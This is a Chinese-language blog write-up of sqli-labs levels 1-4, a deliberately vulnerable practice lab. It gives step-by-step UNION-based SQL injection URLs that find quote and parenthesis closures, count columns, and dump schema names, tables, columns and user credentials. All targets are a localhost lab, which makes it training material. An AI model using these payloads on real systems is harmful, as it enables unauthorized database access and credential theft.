# 原创
：  （手工）【sqli-labs靶场1-4】GET请求、错误注入、单引号、双引号、括号闭合、字符型、整型

# （手工）【sqli-labs靶场1-4】GET请求、错误注入、单引号、双引号、括号闭合、字符型、整型

**目录**

[SQL注入基本步骤：](#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[一、Less1（GET-Error based - Single quotes -String）](#%E4%B8%80%E3%80%81Less1%EF%BC%88GET-Error%20based%20-%20Single%20quotes%20-String%EF%BC%89)

[简介：(单引号+字符型注入)](#%E7%AE%80%E4%BB%8B%EF%BC%9A%28%E5%8D%95%E5%BC%95%E5%8F%B7%2B%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%29)

[第一步：注入点测试](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[第二步：查询字段数](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[第三步：判断回显位](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D)

[第四步：查询数据库的基本信息](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)

[第五步：爆数据库名](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[第六步：爆数据库表名](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[第七步：爆字段名](#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[第八步：爆数据](#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[二、Less2（GET-Error based - intiger based）](#%E4%BA%8C%E3%80%81Less2%EF%BC%88GET-Error%20based%20-%20intiger%20based%EF%BC%89)

[简介：（整型注入）](#%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[第一步：注入点测试](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[第二步：查询字段数](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[第三步：判断回显位](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D)

[第四步：查询数据库的基本信息](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)

[第五步：爆数据库名](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[第六步：爆数据库表名](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[第七步：爆字段名](#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[第八步：爆数据](#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[三、Less3（GET-Error based - Single quotes -String）](#%E4%B8%89%E3%80%81Less3%EF%BC%88GET-Error%20based%20-%20Single%20quotes%20-String%EF%BC%89)

[简介：（单引号+括号+字符型注入）](#%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%8D%95%E5%BC%95%E5%8F%B7%2B%E6%8B%AC%E5%8F%B7%2B%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[第一步：注入点测试](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[第二步：查询字段数](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[第三步：判断回显位](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D)

[第四步：查询数据库的基本信息](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)

[第五步：爆数据库名](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[第六步：爆数据库表名](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[第七步：爆字段名](#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[第八步：爆数据](#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[四、Less4（GET-Error based - Double Quotes String）](#%E5%9B%9B%E3%80%81Less4%EF%BC%88GET-Error%20based%20-%20Double%20Quotes%20String%EF%BC%89)

[简介：（双引号+  ）+字符型注入）](#%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%8F%8C%E5%BC%95%E5%8F%B7%2B%C2%A0%20%EF%BC%89%2B%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[第一步：注入点测试](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[第二步：查询字段数](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[第三步：判断回显位](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D)

[第四步：查询数据库的基本信息](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)

[第五步：爆数据库名](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[第六步：爆数据库表名](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[第七步：爆字段名](#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[第八步：爆数据](#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

---


---


 

> 
<h2>（手工）SQL注入基本步骤：</h2>
第一步：注入点测试
第二步：查询字段数
第三步：判断回显位
第四步：查询数据库的基本信息
第五步：爆数据库名
第六步：爆数据库表名
第七步：爆字段名
第八步：爆数据


> 
<h2>一、Less1（GET-Error based - Single quotes -String）</h2>
<h3>简介：(单引号+字符型注入)</h3>
请求方式：GET
方法：错误注入

<hr/>
<h3>**第一步：注入点测试**</h3>

测试闭合符号
http://localhost:8080/sqli-labs-master/Less-1/'
在后面加上了’
发现报错了，说明带入数据库中处理了，且闭合符合为'
可能存在注入点
（使用可能闭合的符号进行测试）


验证注入点
输入ID序号为1的进行查询
（一般没改的化就是ID为关键字）
http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=1
（第一关都还没必要考虑注释掉后面其他的符号）

回显了ID为1的用户信息
说明存在注入 

判断注入类型
闭合前面单引号，注释掉后面引号
通过and连接1=1    和   1=2来判断是否为字符型注入
http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=1' and 1=1--+
（正确回显，因为1=1确实对的，但是还不能下结论）

 http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=1' and 1=2--+
（1=2是错误，且无回显，是1=2注入到数据库影响的）
所有存在字符型注入


<hr/>

<h3>**第二步：查询字段数**</h3>
猜的话，使用二分法往下猜

http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=1' order by 3 --+
（3的时候正常回显，3以下就都能回显，现在应该往上猜）

 http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=1' order by 4 --+
（4的时候报错了，说明是3了）


<hr/>
<h3>**第三步：判断回显位**</h3>
使用联合查询union
将id赋值为假（eg：id=-1）
http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,2,3 --+

 报错回显2，3
说明第2，3个位置可以报错回显查询
<hr/>

<h3>**第四步：查询数据库的基本信息**</h3>
在第2，3列输入需要查询的命令
http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,database(),user() --+
报错回显


<hr/>

<h3>**第五步：爆数据库名**</h3>

http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+


<hr/>


<h3>**第六步：爆数据库表名**</h3>

http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

后面的表名'security'也可以直接用database() 
是一样的效果
http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+


<hr/>


<h3>**第七步：爆字段名**</h3>

http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

<hr/>


<h3>**第八步：爆数据**</h3>
http://localhost:8080/sqli-labs-master/Less-1/<br/> ?id=-1' union select 1,username,password from users where id=2 --+




### **第一步：注入点测试**

---


### **第三步：判断回显位**

---


### **第五步：爆数据库名**

---


### **第七步：爆字段名**

---


> 
<h2>二、Less2（GET-Error based - intiger based）</h2>
<h3>简介：（整型注入）</h3>
请求：GET
方法：报错注入

<hr/>
<h3>**第一步：注入点测试**</h3>

测试闭合符号
http://localhost:8080/sqli-labs-master/Less-2/'
在后面加上了’
发现报错了，说明带入数据库中处理了，且闭合符合为'
可能存在注入点
（使用可能闭合的符号进行测试）

 
 

验证注入点
输入ID序号为1的进行查询
（一般没改的化就是ID为关键字）
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=1
（都还没必要考虑注释掉后面其他的符号）

回显了ID为1的用户信息
说明存在注入 

#加上单引号，出现了奇数次


判断注入类型
闭合前面单引号，注释掉后面引号
通过and连接1=1    和   1=2来判断是否为字符型注入
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=1 and 1=1
（正确回显，因为1=1确实对的，但是还不能下结论）

 
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=1 and 1=2
（1=2是错误，且无回显，是1=2注入到数据库影响的）
所有存在字符型注入

 

<hr/>

<h3>**第二步：查询字段数**</h3>
猜的话，使用二分法往下猜

http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=1 order by 3
（3的时候正常回显，3以下就都能回显，现在应该往上猜）

 
 http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=1 order by 4
（4的时候报错了，说明是3了）

 
<hr/>

<h3>**第三步：判断回显位**</h3>
使用联合查询union
将id赋值为假（eg：id=-1）
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,2,3 

 
 报错回显2，3
说明第2，3个位置可以报错回显查询
<hr/>

<h3>**第四步：查询数据库的基本信息**</h3>
在第2，3列输入需要查询的命令
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,database(),user()
报错回显

 
<hr/>


<h3>**第五步：爆数据库名**</h3>

http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata

 

<hr/>


<h3>**第六步：爆数据库表名**</h3>

http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'

 
后面的表名'security'也可以直接用database() 
是一样的效果
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()

 

<hr/>


<h3>**第七步：爆字段名**</h3>

http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'

 
<hr/>


<h3>**第八步：爆数据**</h3>
http://localhost:8080/sqli-labs-master/Less-2/<br/> ?id=-1 union select 1,username,password from users where id=2

 



### **第一步：注入点测试**

---


### **第三步：判断回显位**

---


### **第五步：爆数据库名**

---


### **第七步：爆字段名**

---


> 
<h2>三、Less3（GET-Error based - Single quotes -String）</h2>
<h3>简介：（单引号+括号+字符型注入）</h3>
请求方式：GET
方法：错误注入
<hr/>
<h3>**第一步：注入点测试**</h3>

测试闭合符号
http://localhost:8080/sqli-labs-master/Less-3/'
在后面加上了’
发现报错了，说明带入数据库中处理了，且闭合符合为'
可能存在注入点
（使用可能闭合的符号进行测试）

 
 

验证注入点
输入ID序号为1的进行查询
（一般没改的化就是ID为关键字）
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=1
（都还没必要考虑注释掉后面其他的符号）
 

回显了ID为1的用户信息
说明存在注入 

#加上单引号，报错，提示闭合小括号

闭合括号后，注释后面所有，回显正常
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=1')--+

 

判断注入类型
闭合前面单引号，注释掉后面引号
通过and连接1=1    和   1=2来判断是否为字符型注入
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=1')  and 1=1--+
（正确回显，因为1=1确实对的，但是还不能下结论）

 
 
 http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=1')  and 1=2--+
（1=2是错误，且无回显，是1=2注入到数据库影响的）
所有存在字符型注入

 

<hr/>

<h3>**第二步：查询字段数**</h3>
猜的话，使用二分法往下猜

http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=1')  order by 3--+
（3的时候正常回显，3以下就都能回显，现在应该往上猜）

 
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=1')  order by 4--+
（4的时候报错了，说明是3了）

 

<hr/>
<h3>**第三步：判断回显位**</h3>
使用联合查询union
将id赋值为假（eg：id=-1）
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,2,3--+

 
 报错回显2，3
说明第2，3个位置可以报错回显查询
<hr/>

<h3>**第四步：查询数据库的基本信息**</h3>
在第2，3列输入需要查询的命令
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,database(),user()--+
报错回显

 

<hr/>

<h3>**第五步：爆数据库名**</h3>

http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,2,group_concat(schema_name) from information_schema.schemata--+

 

<hr/>


<h3>**第六步：爆数据库表名**</h3>

http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

 
后面的表名'security'也可以直接用database() 
是一样的效果
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+

 

<hr/>


<h3>**第七步：爆字段名**</h3>

http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

<hr/>
 


<h3>**第八步：爆数据**</h3>
http://localhost:8080/sqli-labs-master/Less-3/<br/> ?id=-1')  union select 1,username,password from users where id=2--+

 


### **第一步：注入点测试**

---


### **第三步：判断回显位**

---


### **第五步：爆数据库名**

---


### **第七步：爆字段名**

---


> 
<h2>四、Less4（GET-Error based - Double Quotes String）</h2>
<h3>简介：（双引号+  ）+字符型注入）</h3>
请求方式：GET
方法：错误注入
<hr/>
<h3>**第一步：注入点测试**</h3>
提示输入id（然后就传入一个ID）

测试闭合符号
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1'
在后面加上了’
正常输出

 
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1"
在后面加上“
提示要闭合  ）

 http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1")--+
闭合了”和），再注释掉后面的
正常回显

 


判断注入类型
闭合前面单引号，注释掉后面引号
通过and连接1=1    和   1=2来判断是否为字符型注入
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1") and 1=1--+
（正确回显，因为1=1确实对的，但是还不能下结论）

 


http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1") and 1=2--+
（1=2是错误，且无回显，是1=2注入到数据库影响的）
所有存在字符型注入

 


<hr/>

<h3>**第二步：查询字段数**</h3>
猜的话，使用二分法往下猜

http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1") order by 3--+
（3的时候正常回显，3以下就都能回显，现在应该往上猜）

 

http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=1") order by 4--+
（4的时候报错了，说明是3了）

 


<hr/>
<h3>**第三步：判断回显位**</h3>
使用联合查询union
将id赋值为假（eg：id=-1）
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,2,3--+

 

 报错回显2，3
说明第2，3个位置可以报错回显查询
<hr/>

<h3>**第四步：查询数据库的基本信息**</h3>
在第2，3列输入需要查询的命令
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,database(),user()--+
报错回显

 


<hr/>

<h3>**第五步：爆数据库名**</h3>

http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata--+

 


<hr/>


<h3>**第六步：爆数据库表名**</h3>

http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

 

后面的表名'security'也可以直接用database() 
是一样的效果
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+

 


<hr/>


<h3>**第七步：爆字段名**</h3>

http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

<hr/>
 



<h3>**第八步：爆数据**</h3>
http://localhost:8080/sqli-labs-master/Less-4/<br/> ?id=-1") union select 1,username,password from users where id =2--+

 


### **第一步：注入点测试**

---


### **第三步：判断回显位**

---


### **第五步：爆数据库名**

---


### **第七步：爆字段名**

---

